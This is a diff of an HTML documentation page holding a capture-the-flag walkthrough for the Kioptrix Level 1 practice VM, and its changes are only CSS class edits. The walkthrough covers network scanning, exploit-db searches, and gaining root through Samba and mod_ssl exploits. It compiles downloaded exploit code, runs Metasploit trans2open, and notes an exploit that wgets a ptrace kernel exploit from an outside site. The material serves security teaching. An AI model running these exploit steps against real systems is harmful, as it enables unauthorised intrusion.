@@ -232,9 +232,9 @@
 <div>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</div></blockquote>
 <div class="section" id="setting-up-the-vmware-vm">
 <h3>3.14.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
-<p>The VM comes packaged as <a class="reference external" href="http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar">Kioptrix_Level_1.rar</a>, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless access to Kioptrix1 via root.</p>
+<p>The VM comes packaged as <a class="reference external" href="http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar">Kioptrix_Level_1.rar</a>, which is a rar archive containing a VMware vmdk file. If you have any setup troubles you can add the disk to an existing Linux VM, mount it, make a copy of <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code>, and delete the root password hash. This will provide passwordless access to Kioptrix1 via root.</p>
 <p>See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. Kioptrix1 runs Red Hat Linux 7.2 (Enigma) with i686 kernel 2.4.7-10. Here’s how you can create a backing store to undo any changes to the disk:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nv">VM</span><span class="o">=</span>kioptrix1
 curl --remote-name http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar
@@ -252,7 +252,7 @@ curl --remote-name http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar
 </pre></div>
 </div>
 <p>Then Linux KVM could use the VM_DISK to create the kioptrix1 VM. The actual command the author used in Debian Linux to create the VM was:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>kioptrix1
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>kioptrix1
 <span class="nv">$SUDO</span> virt-install <span class="se">\</span>
     --network<span class="o">=</span><span class="s2">&quot;bridge=br0,model=ne2k_pci&quot;</span> <span class="se">\</span>
     --name <span class="s2">&quot;</span><span class="nv">$VM</span><span class="s2">&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
@@ -276,7 +276,7 @@ curl --remote-name http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar
 </div>
 <p>During the boot you’ll have to utilize kudzu hardware configuration: “Remove Configuration” for the PCnet LANCE and “Configure” the added RTL-8029(AS) NIC by migrating the existing network configuration. You can “Ignore” the rest of the added devices.</p>
 <p>If kioptrix were running and you wanted to “start over again”:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nv">VM</span><span class="o">=</span>kioptrix1
 <span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
@@ -294,7 +294,7 @@ curl --remote-name http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar
 <div class="section" id="directory-setup">
 <h3>3.14.2.1. Directory setup<a class="headerlink" href="#directory-setup" title="Permalink to this headline">¶</a></h3>
 <p>We’ll refer to the following directories below:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/pentest
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">BASE</span><span class="o">=</span><span class="nv">$HOME</span>/pentest
 <span class="nv">PT</span><span class="o">=</span><span class="nv">$BASE</span>/kioptrix1
 <span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,spider
 <span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
@@ -306,7 +306,7 @@ curl --remote-name http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar
 <div class="section" id="network-reconnaissance">
 <h4>3.14.2.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h4>
 <p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nb">cd</span> <span class="nv">$PT</span>/nmap
 <span class="nv">NMOUT</span><span class="o">=</span>nmap
@@ -321,7 +321,7 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
 <span class="gp">hacker@kali:~/pentest/kioptrix1$</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="gp">hacker@kali:~/pentest/kioptrix1$ cd $</span>PT/nmap
 <span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$</span> <span class="nv">NMOUT</span><span class="o">=</span>nmap
@@ -341,13 +341,13 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p>At this point we have $TARGETS so scan them:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
 <span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.*
 xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.xml -o <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A.html
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ $</span>SUDO nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/nmap$ $</span>SUDO nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -iL <span class="nv">$TARGETS</span> -oA <span class="si">${</span><span class="nv">NMOUT</span><span class="si">}</span>_A
 </span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="hll"><span class="go">Discovered open port 22/tcp on 192.168.1.102</span>
 </span><span class="hll"><span class="go">Discovered open port 443/tcp on 192.168.1.102</span>
@@ -400,14 +400,14 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 <p>Our target kioptrix1 is T=192.168.1.102 and runs:</p>
 <div class="section" id="port-22-openssh-2-9p2-protocol-1-99">
 <h5>3.14.2.2.2.1. port 22: OpenSSH 2.9p2 (protocol 1.99)<a class="headerlink" href="#port-22-openssh-2-9p2-protocol-1-99" title="Permalink to this headline">¶</a></h5>
-<p>Look for actual exploits in <a class="reference external" href="https://www.exploit-db.com/search/">Search Exploit Database</a> with <a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;text=openssh&amp;e_author=&amp;platform=16&amp;type=3">advanced search specifying openssh, linux platform, remote exploits</a>. There were 6 hits of which only <a class="reference external" href="https://www.exploit-db.com/exploits/387/">Dropbear SSH &lt;= 0.34 - Remote Root Exploit</a> looked promising but requires a hacked ssh client. That may be a bit too much work if something easier is available. Running <code class="docutils literal"><span class="pre">searchsploit</span> <span class="pre">openssh</span></code> generated simliar results to the Exploit Database search.</p>
+<p>Look for actual exploits in <a class="reference external" href="https://www.exploit-db.com/search/">Search Exploit Database</a> with <a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;text=openssh&amp;e_author=&amp;platform=16&amp;type=3">advanced search specifying openssh, linux platform, remote exploits</a>. There were 6 hits of which only <a class="reference external" href="https://www.exploit-db.com/exploits/387/">Dropbear SSH &lt;= 0.34 - Remote Root Exploit</a> looked promising but requires a hacked ssh client. That may be a bit too much work if something easier is available. Running <code class="docutils literal notranslate"><span class="pre">searchsploit</span> <span class="pre">openssh</span></code> generated simliar results to the Exploit Database search.</p>
 <p><a class="reference external" href="http://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-6040/Openbsd-Openssh-2.9p2.html">CVE Details Openbsd Openssh 2.9p2 Security Vulnerabilities</a> lists these possible serious exploits: <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2006-5051/">CVE-2006-5051</a> (if GSSAPI authentication is enabled), <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2002-0640/">CVE-2002-0640</a> (if using PAM modules with interactive keyboard  authentication (PAMAuthenticationViaKbdInt)), <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2002-0639/">CVE-2002-0639</a> (when OpenSSH is using SKEY or BSD_AUTH authentication), and <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2002-0083/">CVE-2002-0083</a> (local users or remote malicious servers can gain privileges). Of these, <a class="reference external" href="http://www.cvedetails.com/cve/CVE-2002-0083/">CVS-2002-0083</a> looks most promising, but requires valid credentials. A proof-of-concept is available via <a class="reference external" href="http://www.securityfocus.com/data/vulnerabilities/exploits/osshchan.tgz">/data/vulnerbilites/exploit/osschan.tgz</a>.</p>
 <p>No easy exploits surfaced.</p>
 </div>
 <div class="section" id="ports-80-443-apache-httpd-1-3-20-on-redhat-linux-7-2">
 <h5>3.14.2.2.2.2. ports 80, 443: Apache httpd 1.3.20 on RedHat Linux 7.2<a class="headerlink" href="#ports-80-443-apache-httpd-1-3-20-on-redhat-linux-7-2" title="Permalink to this headline">¶</a></h5>
-<p>kioptrix1 runs Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b), easily onfirmed this with a simple <code class="docutils literal"><span class="pre">socat</span></code> run:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<p>kioptrix1 runs Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b), easily onfirmed this with a simple <code class="docutils literal notranslate"><span class="pre">socat</span></code> run:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> <span class="nb">echo</span> <span class="s2">&quot;HEAD / HTTP1.1&quot;</span> <span class="p">|</span> socat - tcp:<span class="nv">$T</span>:80
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="go">Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span>
@@ -420,8 +420,8 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </div>
 <div class="section" id="ports-111-32768-rpcbind-statd">
 <h5>3.14.2.2.2.3. ports 111, 32768: rpcbind, statd<a class="headerlink" href="#ports-111-32768-rpcbind-statd" title="Permalink to this headline">¶</a></h5>
-<p>Run <code class="docutils literal"><span class="pre">rpcinfo</span> <span class="pre">-p</span> <span class="pre">$T</span></code> to scan port 111:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<p>Run <code class="docutils literal notranslate"><span class="pre">rpcinfo</span> <span class="pre">-p</span> <span class="pre">$T</span></code> to scan port 111:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="hll"><span class="gp">hacker@kali:~$</span> rpcinfo -p <span class="nv">$T</span>
 </span><span class="go">   program vers proto   port</span>
 <span class="hll"><span class="go">    100000    2   tcp    111  portmapper</span>
@@ -433,8 +433,8 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </div>
 <div class="section" id="port-139-netbios-ssn-samba-smbd-workgroup-mygroup">
 <h5>3.14.2.2.2.4. port 139: netbios-ssn Samba smbd (workgroup: MYGROUP)<a class="headerlink" href="#port-139-netbios-ssn-samba-smbd-workgroup-mygroup" title="Permalink to this headline">¶</a></h5>
-<p>Run <code class="docutils literal"><span class="pre">smbclient</span></code> to determine the Samba 2.2.1a version:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> smbclient -L <span class="nv">$T</span> -N
+<p>Run <code class="docutils literal notranslate"><span class="pre">smbclient</span></code> to determine the Samba 2.2.1a version:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> smbclient -L <span class="nv">$T</span> -N
 </span><span class="go">Anonymous login successful</span>
 <span class="hll"><span class="go">Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]</span>
 </span>
@@ -455,8 +455,8 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 </pre></div>
 </div>
 <p><a class="reference external" href="https://www.exploit-db.com/search/?action=search&amp;text=samba&amp;e_author=&amp;platform=16&amp;type=3">Exploit Database search of samba for remote linux</a> got 21 hits of which 2 remote root exploits looked promising: <a class="reference external" href="https://www.exploit-db.com/exploits/10/">Samba &lt;= 2.2.8 - Remote Root Exploit</a> and <a class="reference external" href="https://www.exploit-db.com/exploits/16861/">Samba trans2open Overflow (Linux x86)</a> (for Metasploit). Two to ignore are <a class="reference external" href="https://www.exploit-db.com/exploits/55/">Samba 2.2.8 - (Bruteforce Method) Remote Root Exploit</a> (code was an erector set including 2 mains along with missing include’s) and <a class="reference external" href="https://www.exploit-db.com/exploits/7/">Samba 2.2.x - Remote Root Buffer Overflow Exploit</a> (simply didn’t work).</p>
-<p>Alternatively we could have run <code class="docutils literal"><span class="pre">searchsploit</span> <span class="pre">samba</span></code> to get these same exploits:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> searchsploit samba
+<p>Alternatively we could have run <code class="docutils literal notranslate"><span class="pre">searchsploit</span> <span class="pre">samba</span></code> to get these same exploits:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> searchsploit samba
 </span><span class="go">--------------------------------------------- ---------------------------------- Description                                 |  Path</span>
 <span class="go">--------------------------------------------- ----------------------------------</span>
 <span class="go">Samba 2.2.x - Remote Root Buffer Overflow Ex | /linux/remote/7.pl</span>
@@ -474,13 +474,13 @@ xsltproc <span class="si">${</span><span class="nv">NMOUT</span><span class="si"
 <div class="section" id="dirb">
 <h5>3.14.2.2.3.1. dirb<a class="headerlink" href="#dirb" title="Permalink to this headline">¶</a></h5>
 <p>First scan the web server with <strong class="program">dirb</strong>:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="nb">cd</span> <span class="nv">$PT</span>/spider
 dirb  http://<span class="nv">$T</span>/ -o dirb.txt
 </pre></div>
 </div>
 <p>The results of the scan were:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/spider$</span> cat dirb.txt
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/spider$</span> cat dirb.txt
 </span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="hll"><span class="go">---- Scanning URL: http://192.168.1.102/ ----</span>
 </span><span class="hll"><span class="go">+ http://192.168.1.102/cgi-bin/ (CODE:403|SIZE:272)</span>
@@ -497,13 +497,13 @@ dirb  http://<span class="nv">$T</span>/ -o dirb.txt
 <div class="section" id="nikto">
 <h5>3.14.2.2.3.2. nikto<a class="headerlink" href="#nikto" title="Permalink to this headline">¶</a></h5>
 <p>Next up was a <strong class="program">nikto</strong> scan:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="nb">cd</span> <span class="nv">$PT</span>/spider
 nikto -output nikto.txt -host <span class="nv">$T</span> -port <span class="m">80</span>,443
 </pre></div>
 </div>
 <p>The results of the scan were:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/spider$</span> cat nikto.txt
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix1/spider$</span> cat nikto.txt
 </span><span class="go">- Nikto v2.1.6/2.1.5</span>
 <span class="go">+ Target Host: 192.168.1.102</span>
 <span class="go">+ Target Port: 80</span>
@@ -561,7 +561,7 @@ nikto -output nikto.txt -host <span class="nv">$T</span> -port <span class="m">8
 <div class="section" id="id23">
 <h3>3.14.3.1. Samba &lt;= 2.2.8 - Remote Root Exploit<a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h3>
 <p>The best exploit option appears to be <a class="reference external" href="https://www.exploit-db.com/exploits/10/">Samba &lt;= 2.2.8 - Remote Root Exploit</a>. Here’s the exploit:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/exploit
 <span class="c1"># Kali source at /usr/share/exploitdb/platforms/linux/remote/10.c has format issues:</span>
 <span class="c1">#   (1) CRLF line endings which can be fixed by running &quot;dos2unix 10.c&quot;</span>
 <span class="c1">#   (2) Single lines split in two, giving the compiler fits. Hand-edit to fix those.</span>
@@ -573,7 +573,7 @@ gcc <span class="m">10</span>.c -o exploit10
 </pre></div>
 </div>
 <p>Running this gives us our root exploit:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1$ cd $</span>PT/exploit
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1$ cd $</span>PT/exploit
 <span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span> Kali <span class="nb">source</span> at /usr/share/exploitdb/platforms/linux/remote/10.c has format issues:
 <span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span>   <span class="o">(</span><span class="m">1</span><span class="o">)</span> CRLF line endings which can be fixed by running <span class="s2">&quot;dos2unix 10.c&quot;</span>
 <span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ #</span>   <span class="o">(</span><span class="m">2</span><span class="o">)</span> Single lines split in two, giving the compiler fits. Hand-edit to fix those.
@@ -624,7 +624,7 @@ gcc <span class="m">10</span>.c -o exploit10
 <div class="section" id="id25">
 <h3>3.14.3.2. Samba trans2open Overflow (Linux x86)<a class="headerlink" href="#id25" title="Permalink to this headline">¶</a></h3>
 <p>This option uses the Megasploit Framework. See <a class="reference external" href="http://docs.kali.org/general-use/starting-metasploit-framework-in-kali">Kali Linux Official Documentation - Metasploit Framework</a> for starting the necessary services. Here’s the exploit:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
 <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
 <span class="nv">$SUDO</span> service postgresql start
 <span class="nv">$SUDO</span> service metasploit start
@@ -632,7 +632,7 @@ gcc <span class="m">10</span>.c -o exploit10
 </pre></div>
 </div>
 <p>Then in the msfconsole:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>db_status
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>db_status
 vulns --info --search trans2open
 use exploit/linux/samba/trans2open
 <span class="nb">set</span> RHOST <span class="m">192</span>.168.1.102
@@ -640,7 +640,7 @@ exploit
 </pre></div>
 </div>
 <p>Running the above shows you get root:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ $</span>SUDO msfconsole
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ $</span>SUDO msfconsole
 <span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
 <span class="go">msf &gt; db_status</span>
 <span class="go">[*] postgresql connected to msf3</span>
@@ -680,7 +680,7 @@ exploit
 </pre></div>
 </div>
 <p>And so we have root. Cleanup with:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> service metasploit stop
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> service metasploit stop
 <span class="nv">$SUDO</span> service postgresql stop
 </pre></div>
 </div>
@@ -693,8 +693,8 @@ exploit
 <li>The “wget …” URL needs to be updated to “wget <a class="reference external" href="https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a>”</li>
 <li>get_server_hello declaration “unsigned char *p, *end;” changed to “const …”.</li>
 </ul>
-<p>The code is set to work for a fixed number of offsets so you run <code class="docutils literal"><span class="pre">./exploit764</span></code> to view the possible offsets to try, then <code class="docutils literal"><span class="pre">./exploit764</span> <span class="pre">OFFSET</span> <span class="pre">$T</span> <span class="pre">443</span></code> to run try a particular offset. Here we have the choice of 0x6a (doesn’t work) and 0x6b (does work).</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<p>The code is set to work for a fixed number of offsets so you run <code class="docutils literal notranslate"><span class="pre">./exploit764</span></code> to view the possible offsets to try, then <code class="docutils literal notranslate"><span class="pre">./exploit764</span> <span class="pre">OFFSET</span> <span class="pre">$T</span> <span class="pre">443</span></code> to run try a particular offset. Here we have the choice of 0x6a (doesn’t work) and 0x6b (does work).</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/kioptrix1
 <span class="nb">cd</span> <span class="nv">$PT</span>/exploit
 curl --silent --output <span class="m">764</span>.c https://www.exploit-db.com/download/764
@@ -714,7 +714,7 @@ gcc <span class="m">764</span>.c -o exploit764 -lcrypto
 </pre></div>
 </div>
 <p>Running this gives us our root exploit:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.102
 <span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ PT=$</span>HOME/pentest/kioptrix1
 <span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$ cd $</span>PT/exploit
 <span class="gp">hacker@kali:~/pentest/kioptrix1/exploit$</span> curl --silent --output <span class="m">764</span>.c https://www.exploit-db.com/download/764
